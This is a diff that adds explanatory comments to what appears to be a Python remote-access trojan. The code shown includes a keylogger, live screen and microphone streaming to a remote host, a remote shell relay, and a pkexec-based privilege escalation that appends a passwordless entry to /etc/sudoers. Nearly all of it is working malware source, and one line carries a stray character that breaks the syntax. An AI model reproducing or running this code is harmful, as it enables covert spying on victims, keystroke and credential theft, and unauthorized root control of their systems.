@@ -13,7 +13,7 @@ import cv2
 import numpy as np
 import pyautogui
 import pyaudio
-import mss
+import mss # for screen capture
 from pynput import keyboard
 
 # --- Configuration ---
@@ -102,23 +102,29 @@ def shell():
             reliable_send((out + err).decode(errors='ignore'))
 
 # --- Keylogger ---
+# send key presses to the server
 def socket_send(target, data):
     try:
+        #convert the data to JSON format and then send through the socket 
         target.send(json.dumps(data).encode())
     except:
         pass
 
+# often call when a key is pressed
 def on_press(key, target):
     try:
+        #check if the key has a char attribute, if not use the name attribute
         char = key.char if hasattr(key, 'char') and key.char else key.name
         socket_send(target, char)
     except:
         pass
 
+# read key presses from the keyboard and send them to the server
 def keylogger_reader(target):
     with keyboard.Listener(on_press=lambda k: on_press(k, target)) as listener:
         listener.join()
 
+# use to start the keylogger
 def keylogger_handler():
     global keylogger_socket, keylogger_thread
     keylogger_socket = socket.socket()
@@ -160,25 +166,29 @@ def find_suid_binaries():
     return suids
 
 def privilege_escalator(user):
-    global read_stream_result
-    read_stream_result = ''
-    reliable_send(os.name)
-    suids = find_suid_binaries()
+    global read_stream_result 
+    read_stream_result = '' #global variable to store the result of reading the stream (check if the user is root when use command 'whoami')
+    reliable_send(os.name) #send the OS name to the server (posix or not)
+    suids = find_suid_binaries() ๓ #find all SUID binaries on the system
     result = f"{'Found pkexec' if '/usr/bin/pkexec' in suids else 'NO pkexec'}\n{suids}"
     reliable_send(result)
-    if '/usr/bin/pkexec' in suids:
+    if '/usr/bin/pkexec' in suids: # if pkexec is found, start the escalation process
+        # wait for the target to authenticate (show pop up window that user need to add password)
         proc = subprocess.Popen('pkexec /bin/bash', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        # start threads to read bash shell
         threading.Thread(target=read_stream, args=(proc.stdout,), daemon=True).start()
         threading.Thread(target=read_stream, args=(proc.stderr,), daemon=True).start()
         while True:
             time.sleep(2)
             reliable_send('Waiting for user authentication')
-            proc.stdin.write(b'whoami\n')
+            proc.stdin.write(b'whoami\n') #send command (whoami) to check if the user is root 
             proc.stdin.flush()
             if read_stream_result == 'root':
                 reliable_send('AUTHENTICATED')
                 break
+        # add the user to sudoers file with NOPASSWD option
         cmd = f"echo '{user} ALL=(ALL) NOPASSWD:ALL' > /tmp/sudoers_entry && cat /tmp/sudoers_entry >> /etc/sudoers"
+        # send the command to the bash shell to add the user to sudoers file
         proc.stdin.write(cmd.encode() + b'\n')
         proc.stdin.flush()
         time.sleep(5)
@@ -187,24 +197,26 @@ def privilege_escalator(user):
 
 # --- Screen & Audio Streaming ---
 CHUNK, CHANNELS, RATE = 1024, 1, 44100
-FORMAT = pyaudio.paInt16
-screen_process = None
+FORMAT = pyaudio.paInt16 #format for audio stream
+screen_process = None # global variable to hold the screen streaming process
 
+#send video of screen via socket
 def video_stream(sock):
-    w,h = pyautogui.size()
+    w,h = pyautogui.size() # width and height of the screen
     with mss.mss() as sct:
         monitor = {'top':0,'left':0,'width':w,'height':h}
         while True:
-            img = np.array(sct.grab(monitor))
-            _, buf = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY,50])
+            img = np.array(sct.grab(monitor)) # capture the screen and convert to numpy array
+            _, buf = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY,50]) # encode the capture screnn to the image as JPEG
             msg = struct.pack('>L', len(buf)) + buf.tobytes()
-            try: sock.sendall(msg)
+            try: sock.sendall(msg) #send the encoded image over the socket
             except: break
     sock.close()
 
+#send audio stream via socket
 def audio_stream(sock):
     p = pyaudio.PyAudio()
-    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
+    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK) # open the audio stream from the microphon
     while True:
         data = stream.read(CHUNK, exception_on_overflow=False)
         packet = struct.pack('>L', len(data)) + data
@@ -212,6 +224,7 @@ def audio_stream(sock):
         except: break
     sock.close(); stream.stop_stream(); stream.close(); p.terminate()
 
+# --- Screen Streamer Process ---
 def screen_streamer():
     v_sock = socket.socket(); v_sock.connect((TARGET_IP, VIDEO_PORT))
     a_sock = socket.socket(); a_sock.connect((TARGET_IP, AUDIO_PORT))
